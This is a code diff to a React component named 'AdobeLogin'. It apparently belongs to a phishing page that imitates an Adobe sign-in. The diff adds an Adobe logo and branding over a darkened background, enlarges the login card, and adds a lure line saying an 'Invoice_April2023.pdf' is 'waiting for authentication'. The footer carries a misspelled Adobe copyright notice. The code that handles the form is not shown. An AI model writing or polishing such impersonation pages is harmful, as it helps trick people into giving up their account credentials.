@@ -42,8 +42,30 @@ export default function AdobeLogin() {
   ];
 
   return (
-    <div className="flex justify-center items-center min-h-screen bg-[#333]">
-      <Card className="bg-[#444] p-8 rounded-lg w-80 text-center shadow-[0_0_20px_rgba(0,0,0,0.5)] max-w-md mx-auto">
+    <div className="relative flex justify-center items-center min-h-screen overflow-hidden">
+      {/* Background Image */}
+      <div 
+        className="absolute inset-0 w-full h-full z-0"
+        style={{
+          backgroundImage: "url('https://images.unsplash.com/photo-1497215842964-222b430dc094?q=80&w=1470&auto=format&fit=crop')",
+          backgroundSize: "cover",
+          backgroundPosition: "center",
+          filter: "brightness(0.4)"
+        }}
+      ></div>
+
+      {/* Adobe Elements in Background */}
+      <div className="absolute top-8 left-8 flex items-center z-10">
+        <img
+          src="https://logo.clearbit.com/adobe.com"
+          alt="Adobe Logo"
+          className="w-10 h-10 mr-3"
+        />
+        <span className="text-white text-xl font-bold">Adobe</span>
+      </div>
+
+      {/* Login Card Overlay */}
+      <Card className="relative z-20 bg-[#444]/95 p-8 rounded-lg w-[380px] text-center shadow-[0_0_30px_rgba(0,0,0,0.7)] max-w-md mx-auto backdrop-blur-sm">
         <div className="flex flex-col items-center">
           {/* Logo Section */}
           <img
@@ -98,6 +120,11 @@ export default function AdobeLogin() {
               CopyRight© 2023 Adobe system incorporated, All right reserved.
             </p>
           </footer>
+          
+          {/* Document Preview Hint */}
+          <div className="mt-4 pt-4 border-t border-gray-700">
+            <p className="text-xs text-gray-300">Document waiting for authentication: <span className="font-medium">Invoice_April2023.pdf</span></p>
+          </div>
         </div>
       </Card>
     </div>
